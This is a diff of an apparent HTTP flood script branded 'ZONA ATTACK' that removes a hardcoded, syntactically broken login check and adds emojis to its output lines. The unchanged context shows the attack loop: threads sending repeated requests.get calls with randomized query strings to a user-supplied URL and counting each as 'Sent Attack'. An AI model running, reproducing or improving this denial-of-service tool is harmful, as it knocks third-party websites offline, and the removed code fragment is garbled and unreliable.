@@ -42,18 +42,6 @@ print("\033[33m                         design By: ZA'99                        
 print("\033[1m                   —°0  please use wisely  0°—                         \033[0m")    
 print("\033[33m⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵\033[0m")      
 print("\033[32m======================================================================\033[0m")
-Username = login
-        username = input('\033[33mEnter your username: \033[0m')
-        password = input('\033[94mEnter your password: \033[0m')
-
-    if username == 'k0l4pz' and password == 'k0l4pz':
-        print('\033[32m***WELCOME TO ZONA ATTACK!!***\033[0m')
-        break
-    else:
-        print('Incorrect credentials. Check if you have Caps lock on and try again.')
-        attemps += 1
-        continue
-        
 url = input("URL:  ").strip()
 
 u = int(0)
@@ -100,11 +88,11 @@ class httpth1(threading.Thread):
                 randomized_url = url + "?" + genstr(random.randint(3, 10))
                 requests.get(randomized_url, headers=headers)
                 u += 1
-                print("\033[92m[\033[97m+\033[92m]\033[32mNOZZ: \033[31m" +str(u)+ " \033[33mSent Attack" +str()+ " \033[95m:." +url+ "\033[0m" )
+                print("\033[92m[\033[97m+\033[92m]\033[32mNOZZ: 🚀\033[31m" +str(u)+ " \033[33mSent Attack" +str()+ " \033[95m:." +url+ "\033[0m" )
                 u += 1
-                print("\033[92m[\033[97m+\033[96m]\033[33mNOZZ: \033[94m" +str(u)+ " \033[95mSent Attack" +str()+ " \033[92m:." +url+ "\033[0m" )
+                print("\033[92m[\033[97m+\033[96m]\033[33mNOZZ: 🚀\033[94m" +str(u)+ " \033[95mSent Attack" +str()+ " \033[92m:." +url+ "\033[0m" )
                 u += 1
-                print("\033[92m[\033[97m+\033[92m]\033[95mNOZZ: \033[97m" +str(u)+ " \033[31mSent Attack" +str()+ "  \033[1m:." +url+ "\033[0m" )
+                print("\033[92m[\033[97m+\033[92m]\033[95mNOZZ: 🚀\033[97m" +str(u)+ " \033[31mSent Attack" +str()+ "  \033[1m:." +url+ "\033[0m" )
                 
                 
             except requests.exceptions.ConnectionError:
